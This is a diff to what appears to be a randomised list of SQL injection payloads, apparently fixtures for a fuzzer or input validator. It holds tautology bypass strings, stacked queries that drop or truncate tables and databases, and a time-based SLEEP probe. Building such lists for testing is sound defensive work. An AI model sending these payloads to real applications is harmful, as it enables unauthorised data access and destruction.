@@ -1,24 +1,24 @@
 ' OR 1 = 1 --
 " OR 1 = 1 --
 1 OR 1 = 1 --
-' OR 1 = 1
+1' OR 1 = 1
 " OR 1 = 1
 1 OR 1 = 1
-' OR 'a' = 'a
+1' OR 'a' = 'a
 1" OR "a" = "a
-') OR ('a' = 'a
+1') OR ('a' = 'a
 ") OR ("a" = "a
-1; DROP TABLE bw; -- 
-1; TRUNCATE TABLE v; --
-1; SELECT ph FROM e WHERE ikg = ek; --
-1; SELECT IF (s = gwh, 1, 0); --
-1; INSERT INTO gs (ws) VALUES (r); --
-1; UPDATE i SET b = i WHERE m = q; --
-1; DELETE FROM g WHERE wfm = uhz; --
-1; SELECT vw FROM f WHERE ujcxa = cnxh UNION  SELECT q FROM t WHERE v = v; --
-1; CREATE DATABASE x; --
-1; DROP DATABASE e; --
+1; DROP TABLE jdq; -- 
+1; TRUNCATE TABLE l; --
+1; SELECT mhs FROM z WHERE rh = wblfulb; --
+1; SELECT IF (a = q, 1, 0); --
+1; INSERT INTO b (c) VALUES (t); --
+1; UPDATE e SET d = tm WHERE x = y; --
+1; DELETE FROM jna WHERE x = i; --
+1; SELECT a FROM v WHERE mv = zm UNION ALL SELECT bz FROM x WHERE xc = clr; --
+1; CREATE DATABASE ugb; --
+1; DROP DATABASE i; --
 1; SHOW DATABASES; --
-1; CREATE TABLE k yr VARCHAR\587\; --
-1'  ORDER BY s; --
-' OR SLEEP(3) --
+1; CREATE TABLE l n VARCHAR\9\; --
+1'  ORDER BY f; --
+' OR SLEEP(7) --
